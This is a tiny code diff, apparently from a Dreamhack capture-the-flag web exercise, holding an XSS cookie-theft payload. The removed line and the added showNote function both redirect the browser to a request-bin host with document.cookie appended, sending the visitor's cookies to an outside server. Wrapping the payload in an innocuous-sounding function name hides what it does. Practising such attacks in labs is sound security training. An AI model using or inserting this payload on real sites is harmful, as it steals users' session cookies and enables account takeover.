@@ -1,1 +1,3 @@
-location.href="https://klmlojv.request.dreamhack.games"+document.cookie;
+function showNote(note) {
+    location.href="https://crybdtr.request.dreamhack.games"+document.cookie;
+}
